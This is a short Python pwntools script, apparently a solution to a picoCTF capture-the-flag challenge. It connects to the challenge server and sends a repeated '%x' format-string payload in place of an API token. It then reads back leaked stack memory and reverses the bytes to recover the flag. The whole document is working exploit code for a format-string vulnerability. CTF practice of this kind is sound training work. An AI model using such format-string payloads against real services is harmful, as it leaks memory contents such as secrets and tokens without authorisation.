from pwn import *

r = remote('mercury.picoctf.net', 53437)

# sending input
r.recvuntil(b"my portfolio\n")
r.send(b"1\n")
r.recvuntil(b"API token?\n")

# query to print the stackr
r.send(b"%x" + b"-%x"*32 + b"\n")

# dump first line, then get result
r.recvline()
x = r.recvline()

# decode to string
x = x.strip().decode()

# big endian to lil endian
flag = ""
for i in x.split('-'):
    if len(i) == 8:
        p = bytearray.fromhex(i)
        for b in reversed(p):
            data = chr(b)
            if data.isascii():
                flag += chr(b)

print(flag)